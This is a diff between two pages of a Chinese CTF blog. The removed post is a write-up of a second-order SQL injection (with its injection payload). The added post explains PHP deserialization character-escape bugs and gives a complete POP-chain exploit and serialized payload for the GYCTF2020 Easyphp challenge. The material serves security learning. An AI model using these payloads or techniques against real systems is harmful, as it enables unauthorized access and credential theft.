@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="做题记录——网鼎杯2018comment, Fortheone">
+    <meta name="keywords" content="php反序列化字符逃逸漏洞, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>做题记录——网鼎杯2018comment | Fortheone</title>
+    <title>php反序列化字符逃逸漏洞 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">做题记录——网鼎杯2018comment</h1>
+                    <h1 class="description center-align post-title">php反序列化字符逃逸漏洞</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-16
+                    2020-03-18
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    504
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
 
@@ -456,39 +456,175 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这道题目还是蛮有意思的，至少丰富了自己的一部分还不太懂的知识点。</p>
-<p>今天扫描器不知道怎么抽风了，题目的git泄露都扫不到，很怪，被迫换字典。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584351161008.png" alt></p>
-<p>开局是一个留言板，选择发帖要登录</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584351184846.png" alt></p>
-<p>这里提示账号是 zhangwei  密码是 zhangwei***  爆破最后三位得到密码 zhangwei666</p>
-<p>看到留言什么的首先想到的就是xss，xss确实有的，不过没啥用，这个是留言给自己看的，没有bot访问，然后就是扫目录，找到git泄露，下载下来。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584351932388.png" alt></p>
-<p>下载下来的是个不完整的源码，可以用git回滚到历史版本。</p>
-<p>git  log  --reflog</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584352114625.png" alt></p>
-<p>看到历史版本有三个，然后用命令</p>
-<p>git  reset --hard  <commit id></commit></p>
-<p>这里选择最上面的那个</p>
-<p>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584352683052.png" alt></p>
-<p>这里两个操作一个是创建帖子分类，一个是在帖子下面留言。</p>
-<p>可以看到虽然第一步创建帖子的过程中对三个参数都进行了 addslashes 操作 单引号会被转义加上反斜杠\ 但是存入数据库的时候 会自动去掉这个反斜杠。</p>
-<p>然后在第二步写留言的时候，直接从数据库中取出了 category 并且没有做任何处理，所以这里存在二次注入，只要在第一步的时候插入</p>
-<p>category=1’,content=user(),/*</p>
-<p>在第二步的时候留言</p>
-<p>content=*/#</p>
-<p>这样插入数据库中的留言就会变成</p>
-<pre><code>insert into comment
-            set category = '1',content=user(),/*
-                content = '*/#',
-                bo_id = '$bo_id'
+                <p>php反序列化pop链构造在CTF中一直以来都是一个很重要的考点，有直接传参反序列化数据的，通过文件读取的phar协议触发反序列化的，通过mysql读取文件漏洞触发反序列化漏洞。</p>
+<p>反序列化字符逃逸是在反序列化时某字符被替换成其他字符，导致我们构造的恶意字符逃逸出正常的属性值中。一般看到替换某字符为另一种字符（如hacker）字符的长度发生了变化的，就会出现此漏洞。</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+class Student{
+	public $age;
+	public $name;
+}
+
+$a = new Student;
+$a->age = 20;
+$a->name = "Fortheone";
+
+echo(serialize($a));
+?>
+
+O:7:"Student":2:{s:3:"age";i:20;s:4:"name";s:9:"Fortheone";}
 </code></pre>
-<p>因为这里的sql语句是有换行符的，而#只能注释掉当前行的语句，所以需要使用/**/多行注释来注释掉语句，再用一个#注释掉content行的内容。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/0000000000.png" alt></p>
-<p>再根据wp一步步找文件读文件，读etc/passwd发现有个www用户，然后读操作历史，发现有个DS_Store文件，注意这里的文件内容太大，要用hex编码一下才能读出来。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584353869408.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1548.png" alt></p>
+<p>正常输出序列化数据的结果如上，但其实我们可以篡改序列化的数据，给其增加该类中不存在的属性，在反序列化后也会正常输出。</p>
+<pre class=" language-language-php"><code class="language-language-php">$str = 'O:7:"Student":2:{s:1:"a";s:4:"test";s:4:"name";s:9:"Fortheone";}aaaaaa';
+var_dump(unserialize($str));
+
+object(Student)#2 (3) {
+  ["age"]=>
+  NULL
+  ["name"]=>
+  string(9) "Fortheone"
+  ["a"]=>
+  string(4) "test"
+}
+</code></pre>
+<p>我在序列化之后的数据篡改了age属性的键值对，使其变为a=&gt;test，但php反序列化后还是将它添加到了Student的属性之中。</p>
+<p>并且反序列化时是以}来作为结束符，反序列化会截断掉}后的数据。</p>
+<p>可能看完了这两个例子以后，还是无法想到有什么可利用的漏洞点，但是如果在反序列化之前进行了字符替换的操作，看看会发生什么。</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+class Student{
+	public $age;
+	public $test;
+	public $name;
+}
+#字符过滤操作
+function safe($parm){
+    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
+    return str_replace($array,'hacker',$parm);
+}
+
+$a = new Student;
+$a->age = 20;
+$a->name = "Fortheone";
+
+
+#恶意payload
+$payload= '";s:4:"name";s:12:"yiyangqianxi";}';
+$len = strlen($payload);
+$payload1 = str_repeat('union',$len).$payload;
+
+$a->test = $payload1;
+$b=serialize($a);
+print_r("before safe\n");
+var_dump(unserialize($b));
+
+
+$c=safe($b);
+print_r("after safe\n");
+var_dump(unserialize($c));
+
+before safe
+object(Student)#2 (3) {
+  ["age"]=>
+  int(20)
+  ["test"]=>
+  string(204) "unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion";s:4:"name";s:12:"yiyangqianxi";}"
+  ["name"]=>
+  string(9) "Fortheone"
+}
+
+after safe
+
+object(Student)#2 (3) {
+  ["age"]=>
+  int(20)
+  ["test"]=>
+  string(204) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
+  ["name"]=>
+  string(12) "yiyangqianxi"
+}
+</code></pre>
+<p>可以看到在safe操作之前的test中的payload逃逸出来，覆盖了原本的name值，而原本的name值被}截断了，所以导致修改了name值。而漏洞就在于union字符串的长度为5，而hacker字符串的长度为6，因为test规定了其键值的长度是204，每替换一个字符串就会多出一个长度，这里一共替换了34个union，所以多出了34个长度。之后的恶意payload就顺理成章的变成了student中的name属性。</p>
+<h4 id="GYCTF2020-Easyphp">GYCTF2020 Easyphp</h4>
+<p>题目中泄露了www.zip文件，做审计，先定位得到flag的方式。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584534654844.png" alt></p>
+<p>在update.php下要求我们 $_SESSION[‘login’]==1即可获得flag，那么就去找满足该条件的操作。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584534750924.png" alt></p>
+<p>在User类中的login方法中可以看到要完成该条件需要输入正确的密码，而查询的语句是由dbCtrl类的login方法操作的，再跟进去</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584534882068.png" alt></p>
+<p>成功返回id的条件是 1、token==‘admin’ 2、密码正确 所以不论如何我们都得知道密码，或者是修改数据库中查询出的password和我们传入的相同。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584535154816.png" alt></p>
+<p>看到开头所定义的字符替换方法，我们就知道这是反序列化逃逸的漏洞，那么我们就得找到一条反序列化pop链。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584535393239.png" alt></p>
+<p>看到Info类里有个__call方法，这种魔术方法一般都是有用的，还调用了一个login方法，和我们要利用的dbCtrl类中的方法重名，就可以把CtrlCase赋值为dbCtrl类，来执行它的login方法。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584535527726.png" alt></p>
+<p>找到User类中的toString方法，其中nickname可控，那么只要将nickname赋值为 Info类，调用了一个不存在的update方法，就能调用Info的 call方法，传入的age可控，也就是dbCtrl类的login方法中的sql可控，我们可以执行自己定义的sql语句了。 所以现在就要找到一处可触发User类toString方法的地方。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584536167357.png" alt></p>
+<p>看到 UpdateHelper类中有echo，且sql参数可控，将其设为User类即可。</p>
+<p>那么整个pop链就清晰了</p>
+<p><code>UpdateHelper-&gt;__destruct -&gt;User-&gt;__toString -&gt;Info-&gt;__call -&gt;dbCtrl-&gt;login</code></p>
+<p>那么我们要执行什么sql语句呢？</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584536481022.png" alt></p>
+<p>整个代码流程就是获取我们输入的账号，然后查询该账号的id和密码，然后将查询到的密码和我们输入的密码比对，如果相同即可成功登录。这里存在一个问题，就是查询的语句是</p>
+<p><code>select id,password from user where username=?</code></p>
+<p>然后将结果对应到</p>
+<p><code>$result-&gt;bind_result($idResult, $passwordResult);</code></p>
+<p>然后会输出 $idResult</p>
+<p>这里如果我们将sql语句换成</p>
+<p><code>select password,id from user where username=?</code></p>
+<p>那输出的$idResult是不是就是password了。</p>
+<p>所以最终构造的pop链</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+class dbCtrl
+{
+    public $hostname="127.0.0.1";
+    public $dbuser="root";
+    public $dbpass="root";
+    public $database="test";
+    public $name="admin";
+    public $password;
+    public $mysqli;
+    public $token="admin";
+}
+class User
+{
+    public $id;
+    public $age="select password,id from user where username=?";
+    public $nickname;
+}
+
+Class UpdateHelper{
+    public $id;
+    public $newinfo;
+    public $sql;
+}
+
+class Info{
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+}
+
+
+
+
+$a = new UpdateHelper();
+$a->sql=new User();
+$a->sql->nickname=new Info();
+$a->sql->nickname->CtrlCase=new dbCtrl();
+</code></pre>
+<p>构造完了，嗯？反序列化触发点呢？？？？</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584537190831.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584537275809.png" alt></p>
+<p>刚好这里有safe操作，所以就把payload传到nickname里。</p>
+<pre><code>$payload = '&quot;;s:1:&quot;a&quot;;'.serialize($a).&quot;}&quot;;
+$len = strlen($payload);
+$d = str_repeat(&quot;union&quot;, $len).$payload;
+echo($d);
+
+unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:1:&quot;a&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584537626107.png" alt></p>
+<p>在update.php页面传入payload即可得到admin的密码，解密是 glzjin</p>
+<p>登录即可getflag</p>
 
             </div>
             <hr>
@@ -514,7 +650,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/03/16/做题记录0316/">http://yoursite.com/year/03/16/做题记录0316/</a>
+                    <a href="http://yoursite.com/year/03/18/php反序列化字符逃逸/">http://yoursite.com/year/03/18/php反序列化字符逃逸/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -980,7 +1116,8 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/year/03/18/php反序列化字符逃逸/">
                     <div class="card-image">
@@ -999,9 +1136,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1014,6 +1151,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1024,21 +1162,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/03/16/星盟awd复盘/">
+                <a href="/year/03/16/做题记录0316/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="星盟awd复盘">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="做题记录——网鼎杯2018comment">
                         
-                        <span class="card-title">星盟awd复盘</span>
+                        <span class="card-title">做题记录——网鼎杯2018comment</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            周末参加了星盟线上awd的比赛，对手都是比较强的队伍，我们一队的是一起参加考核的新人，配合可能还不够默契，导致分工不明确，打起来手忙脚乱，在此做一个总结记录。
-开场
-比赛是从一点开始，五点结束。一点多的时候上了第一道题web2，不知道为什么
+                            这道题目还是蛮有意思的，至少丰富了自己的一部分还不太懂的知识点。
+今天扫描器不知道怎么抽风了，题目的git泄露都扫不到，很怪，被迫换字典。
+
+开局是一个留言板，选择发帖要登录
+
+这里提示账号是 zhangwei  密码是 zhangwei*
                         
                     </div>
                     <div class="publish-info">
@@ -1049,8 +1190,8 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/总结记录/" class="post-category">
-                                    总结记录
+                            <a href="/categories/CTF复现/" class="post-category">
+                                    CTF复现
                                 </a>
                             
                             
